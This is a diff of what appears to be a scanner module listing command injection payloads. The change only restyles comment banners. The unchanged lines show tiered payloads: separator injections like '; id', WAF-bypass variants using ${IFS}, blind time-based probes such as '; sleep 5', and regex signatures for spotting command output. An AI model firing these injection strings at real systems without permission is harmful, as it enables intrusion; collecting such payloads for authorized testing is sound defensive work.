@@ -1,6 +1,6 @@
 """Command injection payloads."""
 
-# -- Tier 1: Unix command injection --------------------------------------------
+# ── Tier 1: Unix command injection ────────────────────────────────────────────
 CMDI_T1 = [
     "; id",
     "| id",
@@ -15,7 +15,7 @@ CMDI_T1 = [
     "; uname -a",
 ]
 
-# -- Tier 2: WAF bypass / encoding ---------------------------------------------
+# ── Tier 2: WAF bypass / encoding ─────────────────────────────────────────────
 CMDI_T2 = [
     # IFS separator
     ";${IFS}id",
@@ -41,18 +41,18 @@ CMDI_T2 = [
     "| dir",
 ]
 
-# -- Tier 3: Time-based (blind) ------------------------------------------------
+# ── Tier 3: Time-based (blind) ────────────────────────────────────────────────
 CMDI_TIME = [
     "; sleep 5",
     "| sleep 5",
     "& sleep 5",
     "$(sleep 5)",
     "`sleep 5`",
-    "; ping -c 5 127.0.0.1",  # 5 ICMP -> ~5 seconds
+    "; ping -c 5 127.0.0.1",  # 5 ICMP → ~5 seconds
     "& timeout 5",            # Windows
 ]
 
-# -- Output signatures in response body ----------------------------------------
+# ── Output signatures in response body ────────────────────────────────────────
 CMDI_OUTPUT_SIGS = [
     r"uid=\d+",
     r"gid=\d+",
